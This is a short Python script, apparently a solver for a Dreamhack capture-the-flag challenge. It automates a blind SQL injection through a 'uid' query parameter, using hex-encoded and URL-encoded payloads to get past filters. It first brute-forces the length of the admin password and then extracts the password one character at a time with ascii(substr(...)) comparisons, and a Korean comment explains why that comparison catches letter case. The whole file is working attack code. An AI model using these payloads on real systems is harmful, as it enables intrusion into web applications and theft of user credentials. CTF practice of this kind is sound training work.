import requests
import string

host = 'http://host3.dreamhack.games:11628/?uid='
headers = {'Cookie':'sessionid=e25e700cb079c6fd'} 
pw = ''

for i in range(1, 100):
    payload = f"'||uid=0x61646d696e%26%26length(upw)={i}%23"
    r = requests.get(host+payload, headers=headers)
    print(i)
    if "admin" in r.text:
        print(f"find pw length : {i}")
        length = i
        break

# 여기서 굳이 ascii를 쓰는 이유는 만약 ascii를 쓰지 않고 그냥 substr로 해서 비교를 하면 대소문자를 비교할 수가 없다.
# 그냥 똑같이 d와 D를 보기 때문에 ascii를 사용해야 한다.
for i in range(1, length + 1):
    for j in range(33, 127):
        payload = f"'||uid=0x61646d696e%26%26ascii(substr(upw,{i},1))={j}%23"
        r = requests.get(host+payload, headers=headers)
        print(j)
        if "admin" in r.text:
            print(f"find pw : {chr(j)}")
            pw += chr(j)
            break

print(f"pull password : {pw}")